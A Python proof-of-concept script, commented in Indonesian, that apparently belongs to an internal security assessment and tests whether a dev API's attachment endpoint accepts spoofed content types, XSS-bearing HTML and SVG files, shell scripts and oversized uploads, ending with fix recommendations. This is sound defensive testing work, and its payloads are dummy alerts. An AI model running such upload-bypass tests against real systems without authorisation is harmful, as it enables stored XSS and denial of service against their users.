#!/usr/bin/env python3
"""
PoC: MEDIUM-015 — File Upload Tanpa Validasi Tipe dan Ukuran
=============================================================
Demonstrasi bahwa endpoint upload attachment tidak memvalidasi
tipe file dari sisi server — hanya mengandalkan content_type
dari client yang mudah dimanipulasi.

TUJUAN DEMO:
  1. Upload file dengan ekstensi berbahaya (.html, .svg, .sh)
     menyamar sebagai PDF (content_type manipulation)
  2. Upload file oversized untuk test DoS vector
  3. Membuktikan file tersimpan di storage tanpa penolakan

CARA MENJALANKAN:
  pip install requests
  python MEDIUM-015-file-upload-bypass.py

SAFETY: File yang diupload berisi teks dummy — tidak executable.
        Jalankan HANYA di environment DEV.
        Hapus hasil upload setelah testing selesai.
"""

import os
import sys
import tempfile

try:
    import requests
except ImportError:
    print("Install dulu: pip install requests")
    sys.exit(1)

# ──────────────────────────────────────────────
# KONFIGURASI — sesuaikan dengan DEV environment
# ──────────────────────────────────────────────
from dotenv import load_dotenv
load_dotenv(".env.poc")

API_BASE   = os.getenv("API_BASE", "https://dev-api.genai.kpc.co.id/api/v1")
DEV_TOKEN  = os.getenv("DEV_TOKEN", "")

# Ganti dengan ID record yang valid di DEV (contract/PO/equipment)
# Format: /scd/contracts/{id}/attachments atau /msd/work-orders/{id}/attachments
UPLOAD_ENDPOINT = f"{API_BASE}/scd/contracts/1/attachments"

HEADERS = {"Authorization": f"Bearer {DEV_TOKEN}"}


def separator(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)


def create_test_file(content: str, suffix: str) -> str:
    """Buat file temporary untuk testing."""
    tmp = tempfile.NamedTemporaryFile(
        mode="w", suffix=suffix, delete=False, prefix="poc_test_"
    )
    tmp.write(content)
    tmp.close()
    return tmp.name


def test_content_type_spoofing():
    separator("TEST 1: Content-Type Spoofing")
    print("  Kirim file .html menyamar sebagai application/pdf\n")

    html_content = "<html><body><h1>PoC Upload Bypass</h1><script>alert('XSS')</script></body></html>"
    filepath = create_test_file(html_content, ".html")

    try:
        with open(filepath, "rb") as f:
            # Kirim file .html tapi declare content_type sebagai PDF
            files = {"file": ("invoice_real.pdf", f, "application/pdf")}
            r = requests.post(
                UPLOAD_ENDPOINT,
                headers=HEADERS,
                files=files,
                timeout=30,
            )

        print(f"  File     : invoice_real.pdf (actual: .html + XSS payload)")
        print(f"  Declared : application/pdf")
        print(f"  Response : HTTP {r.status_code}")

        if r.status_code in [200, 201]:
            print(f"  🔴 BERHASIL DIUPLOAD — server tidak validasi tipe file")
            print(f"  Response: {r.text[:300]}")
        elif r.status_code == 401:
            print(f"  ⚠️  Token tidak valid atau expired — perbarui DEV_TOKEN di .env.poc")
        elif r.status_code == 422:
            print(f"  ✅ Server menolak file — validasi ada")
            print(f"  Response: {r.text[:300]}")
        else:
            print(f"  ℹ️  HTTP {r.status_code}: {r.text[:300]}")

    finally:
        os.unlink(filepath)


def test_dangerous_extensions():
    separator("TEST 2: Upload File Dengan Ekstensi Berbahaya")

    test_cases = [
        (".svg",  "image/svg+xml",       "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"),
        (".sh",   "application/x-sh",    "#!/bin/bash\necho 'PoC shell upload'\n"),
        (".py",   "text/plain",           "print('PoC python upload')\n"),
        (".html", "text/html",            "<script>document.cookie</script>"),
    ]

    for ext, ctype, content in test_cases:
        filepath = create_test_file(content, ext)
        try:
            with open(filepath, "rb") as f:
                files = {"file": (f"poc_test{ext}", f, ctype)}
                r = requests.post(
                    UPLOAD_ENDPOINT,
                    headers=HEADERS,
                    files=files,
                    timeout=15,
                )

            result = "🔴 DITERIMA" if r.status_code in [200, 201] else f"✅ Ditolak (HTTP {r.status_code})"
            print(f"  {ext:6}  {ctype:30}  →  {result}")
        except requests.exceptions.ConnectionError:
            print(f"  {ext:6}  →  Connection failed")
        finally:
            os.unlink(filepath)


def test_size_limit():
    separator("TEST 3: Upload File Tanpa Batas Ukuran (DoS Vector)")
    print("  Upload file 15MB — cek apakah ada size limit\n")

    # Buat file 15MB
    SIZE_MB = 15
    filepath = create_test_file("X" * (SIZE_MB * 1024 * 1024), ".pdf")

    try:
        file_size_mb = os.path.getsize(filepath) / (1024 * 1024)
        print(f"  File size : {file_size_mb:.1f} MB")

        with open(filepath, "rb") as f:
            files = {"file": ("large_file.pdf", f, "application/pdf")}
            try:
                r = requests.post(
                    UPLOAD_ENDPOINT,
                    headers=HEADERS,
                    files=files,
                    timeout=60,
                )
                if r.status_code in [200, 201]:
                    print(f"  🔴 FILE {file_size_mb:.0f}MB BERHASIL DIUPLOAD — tidak ada size limit")
                elif r.status_code == 413:
                    print(f"  ✅ HTTP 413 — Server membatasi ukuran file")
                else:
                    print(f"  ℹ️  HTTP {r.status_code}: {r.text[:200]}")
            except requests.exceptions.ReadTimeout:
                print(f"  ⚠️  Timeout — server mungkin memproses atau menolak file besar")
            except requests.exceptions.SSLError:
                print(f"  ✅ Koneksi diputus paksa oleh server/load balancer (SSL EOF)")
                print(f"     → Server MENOLAK upload {file_size_mb:.0f}MB via connection drop")
                print(f"     → Tidak ada HTTP 413 response — batas ukuran ada tapi tidak graceful")
                print(f"     ℹ️  Ini bisa dari Cloud Run max request size atau WAF/load balancer")
            except requests.exceptions.ConnectionError as e:
                if "EOF" in str(e) or "Connection" in str(e):
                    print(f"  ✅ Koneksi diputus paksa oleh server/load balancer (Connection reset)")
                    print(f"     → Server MENOLAK upload {file_size_mb:.0f}MB")
                else:
                    print(f"  ⚠️  Connection error: {e}")
    finally:
        os.unlink(filepath)
        print(f"\n  File temporary sudah dihapus")


def summary():
    separator("CARA BACA HASIL")
    print("""
  🔴 DITERIMA  → Finding terkonfirmasi — server tidak memvalidasi
  ✅ Ditolak   → Validasi sudah ada, finding tidak aktif
  ⚠️  Warning   → Perlu pengecekan manual

  REKOMENDASI FIX (jika finding terkonfirmasi):
  → app/services/attachments_service.py
  → Tambahkan:
     1. Whitelist MIME type: ['application/pdf', 'image/jpeg', ...]
     2. Validasi server-side dengan python-magic (bukan dari header)
     3. Batas ukuran: if byte_size > 50 * 1024 * 1024: raise error
    """)


if __name__ == "__main__":
    if not DEV_TOKEN:
        print("❌ DEV_TOKEN belum di-set di .env.poc")
        print("   Jalankan: python setup.py")
        sys.exit(1)

    print("=" * 60)
    print("  PoC MEDIUM-015 — File Upload Validation Bypass")
    print(f"  Target  : {UPLOAD_ENDPOINT}")
    print("  Mode    : DEV ONLY — File berisi konten dummy")
    print("  WARNING : Jalankan HANYA di environment DEV")
    print("=" * 60)

    test_content_type_spoofing()
    test_dangerous_extensions()
    test_size_limit()
    summary()
